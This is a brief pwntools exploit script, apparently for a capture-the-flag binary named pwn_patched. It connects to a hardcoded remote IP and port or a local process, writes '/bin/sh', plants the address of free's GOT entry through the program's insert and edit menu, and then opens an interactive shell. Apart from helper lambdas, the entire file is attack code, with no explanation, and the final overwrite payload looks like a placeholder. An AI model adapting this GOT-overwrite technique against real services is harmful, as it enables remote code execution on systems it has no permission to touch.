from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["49.233.15.226",8003]
libc=ELF('libc.so.6')
elf = ELF('./pwn_patched')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("pwn_patched")
    context(arch='amd64', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

def insert(str):
    ru(b' :\n')
    s(b'1')
    ru(b' :\n')
    s(str)

def remake(num,str):
    ru(b' :\n')
    s(b'2')
    ru(b' ?\n')
    s(num)
    ru(b' :\n')
    s(str)

free_got = p64(elf.got['free'])

gdb.attach(p)
ru(b' :\n')
s(b'/bin/sh\x00')
insert(b'111122223333111122223333')
insert(free_got)
remake(b'1',b'lovemebaby')

shell()